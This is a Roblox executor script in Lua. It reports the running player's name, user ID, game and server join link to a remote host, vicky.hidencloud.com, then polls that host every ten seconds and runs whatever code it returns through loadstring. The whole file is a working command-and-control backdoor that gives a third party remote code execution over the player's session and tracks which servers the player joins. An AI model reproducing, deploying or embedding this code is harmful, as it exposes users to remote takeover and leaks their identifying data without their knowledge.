local player = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")

local req = syn and syn.request or request or http_request or http.request or fluxus and fluxus.request
local WORKER_URL = "http://vicky.hidencloud.com:24623/"
local playerId = tostring(player.UserId)
local running = true
local SCRIPT_TYPE = "script1"

if not req then
    print("latogd")
    return
end

local function sendToWorker(data)
    pcall(function()
        req({
            Url = WORKER_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
end

local function sendJoin()
    local placeName = MarketplaceService:GetProductInfo(game.PlaceId).Name
    local serverLink = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&launchData=" .. game.PlaceId .. "/" .. game.JobId
    sendToWorker({
        type = "join",
        name = player.Name,
        id = playerId,
        place = placeName,
        serverLink = serverLink,
        count = #game.Players:GetPlayers(),
        script = SCRIPT_TYPE
    })
end

local function sendLeave()
    sendToWorker({
        type = "leave",
        id = playerId,
        name = player.Name,
        script = SCRIPT_TYPE
    })
end

local function pollCommands()
    if not req then return end
    
    local success, res = pcall(function()
        return req({
            Url = WORKER_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                type = "poll",
                id = playerId,
                script = SCRIPT_TYPE
            })
        })
    end)
    
    if not success or not res or res.StatusCode ~= 200 then return end
    
    local success2, cmds = pcall(function()
        return HttpService:JSONDecode(res.Body)
    end)
    
    if not success2 or not cmds then return end
    
    for _, cmd in ipairs(cmds) do
        pcall(function()
            loadstring(cmd.code)()
        end)
    end
end

sendJoin()

coroutine.wrap(function()
    while running do
        pollCommands()
        task.wait(10)
    end
end)()

game.Players.PlayerRemoving:Connect(function(p)
    if p == player then
        running = false
        sendLeave()
    end
end)
